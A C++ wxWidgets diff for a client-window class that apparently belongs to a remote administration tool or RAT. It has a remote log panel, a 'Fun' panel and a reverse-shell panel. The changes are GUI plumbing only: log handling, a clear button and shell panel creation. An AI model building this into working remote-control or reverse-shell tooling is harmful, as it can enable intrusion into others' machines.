@@ -245,9 +245,9 @@ FrameCliente::FrameCliente(SOCKET _sckSocket, std::string _strID, std::string _s
     wxPanel* pnl_LogRemoto = new wxPanel(this, wxID_ANY, wxDefaultPosition, wxDefaultSize);
     wxStaticBoxSizer* log_sizer = new wxStaticBoxSizer(wxVERTICAL, pnl_LogRemoto, "Log remoto");
 
-    wxTextCtrl* txtLog = new wxTextCtrl(pnl_LogRemoto, wxID_ANY, "Happy Hacking!!!", wxDefaultPosition, wxSize(wxDefaultSize.GetWidth(), 150), wxTE_MULTILINE | wxTE_READONLY | wxTE_WORDWRAP);
+    this->txtLog = new wxTextCtrl(pnl_LogRemoto, wxID_ANY, wxEmptyString, wxDefaultPosition, wxSize(wxDefaultSize.GetWidth(), 150), wxTE_MULTILINE | wxTE_READONLY | wxTE_WORDWRAP);
     
-    log_sizer->Add(txtLog, 0, wxALL | wxEXPAND);
+    log_sizer->Add(this->txtLog, 0, wxALL | wxEXPAND);
     log_sizer->AddSpacer(5);
     log_sizer->Add(new wxButton(pnl_LogRemoto, EnumFrameIDS::BTN_Limpiar_Log, "Limpiar log"), 0, wxALL | wxEXPAND);
 
@@ -383,6 +383,13 @@ void FrameCliente::m_SetEstado(const wxString _str) {
     this->lblestado->SetLabelText(_str);
 }
 
+void FrameCliente::m_AddRemoteLog(const char* _buffer) {
+    wxString strTemp(_buffer);
+    strTemp.append(1, '\n');
+
+    this->txtLog->AppendText(strTemp);
+}
+
 void FrameCliente::OnClosePage(wxAuiNotebookEvent& event) {
     int closedPage = event.GetSelection();
     wxString pageTitle = this->m_tree->p_Notebook->GetPageText(closedPage);
@@ -433,12 +440,10 @@ void FrameCliente::OnButton(wxCommandEvent& event) {
         panelFun* panelF = new panelFun(this, this->sckCliente);
         panelF->Show();
     } else if (btnID == EnumFrameIDS::BNT_Shell) {
-        if (this->panelShell) {
-            delete this->panelShell;
-            this->panelShell = nullptr;
-        }
         this->panelShell = new panelReverseShell(this, this->sckCliente);
         this->panelShell->Show();
+    }else if (btnID == EnumFrameIDS::BTN_Limpiar_Log) {
+        this->txtLog->Clear();
     }
     
 }
